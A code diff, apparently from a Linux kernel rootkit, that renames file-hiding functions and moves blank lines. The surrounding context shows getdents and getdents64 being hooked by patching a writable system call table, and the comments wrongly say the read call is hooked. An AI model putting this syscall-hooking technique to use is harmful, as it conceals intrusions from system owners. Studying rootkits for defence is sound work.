@@ -32,8 +32,6 @@ typedef asmlinkage ssize_t (*fun_long_int_linux_dirent64_int)(unsigned int, stru
 fun_long_int_linux_dirent_int    original_getdents;
 fun_long_int_linux_dirent64_int  original_getdents64;
 
-
-
 asmlinkage ssize_t hooked_getdents (unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
     struct linux_dirent __user *cur_dirent;
     ssize_t result;
@@ -69,6 +67,8 @@ asmlinkage ssize_t hooked_getdents (unsigned int fd, struct linux_dirent __user 
     return result;
 
 }
+
+
 
 asmlinkage ssize_t hooked_getdents64 (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
     struct linux_dirent64 __user *cur_dirent;
@@ -109,7 +109,7 @@ asmlinkage ssize_t hooked_getdents64 (unsigned int fd, struct linux_dirent64 __u
 }
 
 /* Hooks the read system call. */
-void load_filehiding(void){
+void hide_files(void){
   void** sys_call_table = (void *) ptr_sys_call_table;
 
   // retrieve original functions
@@ -128,7 +128,7 @@ void load_filehiding(void){
 }
 
 /* Hooks the read system call. */
-void unload_filehiding(void){
+void unhide_files(void){
   void** sys_call_table = (void *) ptr_sys_call_table;
 
   make_page_writable((long unsigned int) ptr_sys_call_table);
